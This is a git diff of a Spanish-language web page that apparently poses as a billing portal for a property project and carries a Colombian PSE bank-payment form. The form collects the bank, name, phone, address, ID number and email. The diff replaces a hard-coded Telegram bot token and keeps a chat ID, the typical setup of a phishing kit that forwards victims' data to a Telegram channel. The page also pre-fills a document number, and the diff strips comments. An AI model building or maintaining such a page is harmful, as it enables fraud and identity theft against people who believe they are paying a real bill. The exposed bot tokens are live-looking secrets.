@@ -925,7 +925,7 @@ main {
                 
                 <div class="caja-blanca" id="cajaPaso1">
                     <div class="num" id="txtReferencia">16-1003.240405.38361573</div>
-                    <div class="sub">16-1003</div>
+                    <div class="sub" id="txtSubReferencia">16-1003</div>
                     <div class="check" id="checkPaso1">✓</div>
                 </div>
             </div>
@@ -1062,7 +1062,7 @@ main {
 // ==========================================
 // 🔑 CONFIGURACIÓN DE TELEGRAM
 // ==========================================
-const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
+const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
 const TG_CHAT_ID = '7776240161';
 
 // ==========================================
@@ -1157,7 +1157,7 @@ inputValorPagar.addEventListener('input', function() {
 
 // 🚀 VALIDACIÓN DEL FORMULARIO PSE
 function validarFormularioPSE() {
-    if (pasoActualAmarillo !== 3) return; // Solo validar en el paso 3
+    if (pasoActualAmarillo !== 3) return; 
 
     const entidadVal = pseEntidad.value.trim();
     const tipoPersonaVal = pseTipoPersona.value.trim();
@@ -1168,7 +1168,6 @@ function validarFormularioPSE() {
     const documentoVal = pseDocumento.value.trim();
     const correoVal = pseCorreo.value.trim();
 
-    // Si todos tienen texto, encendemos el botón
     if (entidadVal && tipoPersonaVal && nombreVal && celularVal && direccionVal && tipoIdVal && documentoVal && correoVal) {
         btnAccionAmarillo.classList.remove('opaco');
     } else {
@@ -1176,7 +1175,6 @@ function validarFormularioPSE() {
     }
 }
 
-// Escuchar todos los campos del PSE para validar en tiempo real
 formPSE.addEventListener('input', validarFormularioPSE);
 formPSE.addEventListener('change', validarFormularioPSE);
 
@@ -1430,12 +1428,15 @@ function procesarDatosFacturas(texto) {
 
     const partesRef = referenciaCompleta.split('.');
     const idFactura = partesRef.length > 1 ? partesRef[partesRef.length - 1] : referenciaCompleta;
+    // Extraer la primera parte de la referencia (ej: 16-1003)
+    const subReferencia = referenciaCompleta.split('.')[0] || "16-1003";
 
     document.getElementById('txtSaludoNombre').textContent = `¡Hola! ${nombreUsuario}`;
     document.getElementById('txtNombreProyecto').textContent = `LIRIO ET1`; 
     document.getElementById('txtNombreProyectoPaso2').textContent = `LIRIO ET1`;
     
     document.getElementById('txtReferencia').textContent = referenciaCompleta;
+    document.getElementById('txtSubReferencia').textContent = subReferencia;
     document.getElementById('txtTotalFacturas').textContent = totalFacturas;
     document.getElementById('txtTotalCartera').textContent = '$ ' + valorCartera.toLocaleString('es-CO');
 
@@ -1516,9 +1517,8 @@ function iniciarFlujoAmarillo() {
     btnAccionAmarillo.classList.add('opaco');
     inputValorPagar.value = '';
     
-    // Resetear formulario PSE
     formPSE.reset(); 
-    pseDocumento.value = '38361573'; // Dejar el doc por defecto
+    pseDocumento.value = '38361573'; 
 
     actualizarPasoAmarillo();
 }
@@ -1562,7 +1562,7 @@ function actualizarPasoAmarillo() {
         paso3Amarillo.style.display = 'block';
         containerValorPagar.style.display = 'none';
         btnAccionAmarillo.innerHTML = `✓ REALIZAR PAGO`;
-        btnAccionAmarillo.classList.add('opaco'); // Inicia bloqueado hasta llenar el form
+        btnAccionAmarillo.classList.add('opaco'); 
 
         circuloPaso1.classList.add('completado');
         circuloPaso2.classList.add('completado');
